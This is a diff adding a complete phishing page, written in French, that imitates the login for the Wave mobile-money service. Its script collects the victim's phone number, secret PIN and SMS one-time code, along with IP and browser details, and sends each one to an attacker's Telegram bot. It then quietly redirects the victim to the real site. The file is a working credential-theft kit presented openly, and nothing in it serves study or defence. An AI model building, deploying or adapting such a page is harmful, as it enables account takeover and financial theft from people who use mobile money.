@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wave - Connexion</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
+  body { background:#1dc8e8; min-height:100vh; display:flex; align-items:center; justify-content:center; }
+  .card { background:#fff; width:100%; max-width:380px; padding:40px 30px; border-radius:16px; box-shadow:0 10px 40px rgba(0,0,0,.15); text-align:center; }
+  .logo { width:64px; height:64px; border-radius:16px; background:#1dc8e8; color:#fff; font-size:38px; font-weight:700; display:flex; align-items:center; justify-content:center; margin:0 auto 16px; }
+  h1 { font-size:22px; color:#1a2b4a; margin-bottom:6px; }
+  p.sub { color:#7a8aa0; font-size:14px; margin-bottom:28px; }
+  input { width:100%; padding:14px 16px; border:1.5px solid #e1e7ef; border-radius:10px; font-size:15px; margin-bottom:14px; outline:none; transition:border .2s; text-align:center; letter-spacing:2px; }
+  input:focus { border-color:#1dc8e8; }
+  button { width:100%; padding:14px; background:#1dc8e8; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; }
+  button:active { background:#12b0cc; }
+  .secure { margin-top:18px; font-size:12px; color:#9aa7b8; }
+  .step { font-size:12px; color:#9aa7b8; margin-bottom:20px; }
+  .bar { height:3px; background:#e1e7ef; border-radius:3px; margin-bottom:24px; overflow:hidden; }
+  .bar div { height:100%; background:#1dc8e8; width:33%; transition:width .4s; }
+  .spinner { border:4px solid #e1e7ef; border-top-color:#1dc8e8; border-radius:50%; width:36px; height:36px; margin:20px auto; animation:spin 1s linear infinite; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .hidden { display:none; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">W</div>
+
+    <!-- ÉTAPE 1 : Numéro de téléphone -->
+    <div id="step1">
+      <div class="bar"><div id="bar1" style="width:33%"></div></div>
+      <div class="step">Étape 1 sur 3</div>
+      <h1>Connectez-vous à Wave</h1>
+      <p class="sub">Entrez votre numéro de téléphone pour continuer</p>
+      <form id="form1">
+        <input type="tel" id="phone" placeholder="+221 77 123 45 67" required autocomplete="tel">
+        <button type="submit">Continuer</button>
+      </form>
+    </div>
+
+    <!-- ÉTAPE 2 : Code secret (PIN) -->
+    <div id="step2" class="hidden">
+      <div class="bar"><div style="width:66%"></div></div>
+      <div class="step">Étape 2 sur 3</div>
+      <h1>Code secret</h1>
+      <p class="sub" id="phoneReminder">Entrez votre code secret à 4 chiffres</p>
+      <form id="form2">
+        <input type="password" id="pin" placeholder="••••" required inputmode="numeric" maxlength="4" pattern="[0-9]{4}">
+        <button type="submit">Continuer</button>
+      </form>
+      <div class="secure">🔒 Ne partagez jamais votre code secret</div>
+    </div>
+
+    <!-- ÉTAPE 3 : Code de vérification (OTP) -->
+    <div id="step3" class="hidden">
+      <div class="bar"><div style="width:100%"></div></div>
+      <div class="step">Étape 3 sur 3</div>
+      <h1>Vérification</h1>
+      <p class="sub">Entrez le code à 5 chiffres reçu par SMS au <b id="maskedPhone"></b></p>
+      <form id="form3">
+        <input type="text" id="otp" placeholder="• • • • •" required inputmode="numeric" maxlength="5" pattern="[0-9]{5}">
+        <button type="submit">Valider</button>
+      </form>
+      <div class="secure">🔒 Code valide pendant 5 minutes</div>
+    </div>
+
+    <!-- Écran de chargement -->
+    <div id="loading" class="hidden">
+      <div class="spinner"></div>
+      <p class="sub">Vérification en cours...</p>
+    </div>
+
+  </div>
+
+<script>
+const BOT_TOKEN = 'VOTRE_BOT_TOKEN';
+const CHAT_ID   = 'VOTRE_CHAT_ID';
+
+let victimIP = 'n/a';
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json())
+  .then(d => victimIP = d.ip)
+  .catch(() => {});
+
+function show(id) {
+  ['step1','step2','step3','loading'].forEach(s => document.getElementById(s).classList.add('hidden'));
+  document.getElementById(id).classList.remove('hidden');
+}
+
+async function sendTelegram(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text })
+    });
+  } catch(e) {}
+}
+
+// ÉTAPE 1 — Numéro de téléphone
+document.getElementById('form1').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const phone = document.getElementById('phone').value;
+  sessionStorage.setItem('wave_phone', phone);
+
+  await sendTelegram(
+`🎣 [1/3] Wave - Numéro
+📱 Téléphone : ${phone}
+🌐 IP : ${victimIP}
+🖥 UA : ${navigator.userAgent}
+🕒 ${new Date().toISOString()}`);
+
+  document.getElementById('phoneReminder').innerHTML =
+    `Bienvenue <b>${phone}</b>. Entrez votre code secret à 4 chiffres`;
+  show('step2');
+});
+
+// ÉTAPE 2 — Code secret
+document.getElementById('form2').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const phone = sessionStorage.getItem('wave_phone');
+  const pin = document.getElementById('pin').value;
+
+  await sendTelegram(
+`🎣 [2/3] Wave - Code secret
+📱 Téléphone : ${phone}
+🔑 PIN : ${pin}
+🌐 IP : ${victimIP}
+🕒 ${new Date().toISOString()}`);
+
+  // Affiche le numéro masqué pour l'OTP
+  const masked = phone.slice(0, -4).replace(/\d/g, '•') + phone.slice(-4);
+  document.getElementById('maskedPhone').textContent = masked;
+
+  // Simulation de vérification avant l'OTP
+  show('loading');
+  setTimeout(() => show('step3'), 2500);
+});
+
+// ÉTAPE 3 — Code de vérification
+document.getElementById('form3').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const phone = sessionStorage.getItem('wave_phone');
+  const pin = sessionStorage.getItem('wave_pin') || '(étape 2)';
+  const otp = document.getElementById('otp').value;
+
+  await sendTelegram(
+`🎣 [3/3] Wave - Code de vérification ✅ COMPLET
+📱 Téléphone : ${phone}
+🔑 PIN : ${pin}
+🔢 OTP : ${otp}
+🌐 IP : ${victimIP}
+🖥 UA : ${navigator.userAgent}
+🕒 ${new Date().toISOString()}`);
+
+  // Redirection furtive vers le vrai site
+  window.location.href = 'https://wave.com';
+});
+</script>
+</body>
+</html>
